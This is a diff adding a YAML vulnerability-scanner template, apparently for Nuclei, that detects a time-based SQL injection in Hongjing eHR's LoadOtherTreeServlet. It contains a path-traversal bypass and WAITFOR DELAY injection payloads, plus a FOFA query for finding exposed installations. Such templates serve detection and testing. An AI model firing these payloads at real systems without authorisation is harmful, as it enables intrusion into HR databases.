@@ -1,0 +1,50 @@
+id: poc-yaml-hongjing-ehr-loadothertreeservlet-sqli
+info:
+  name: 宏景eHR LoadOtherTreeServlet SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 宏景eHR
+  metadata:
+    finger: 宏景eHR
+    fofa: app="HJSOFT-HCM"
+
+flow: http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/templates/index/hcmlogon.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/css/hcm/login.css"
+        part: body
+
+  - id: sqli-check
+    method: GET
+    path:
+      - "{{BaseURL}}/w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A5%27--&flag=1"
+      - "{{BaseURL}}/w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A8%27--&flag=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "text=\"root\" title=\"root\""
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
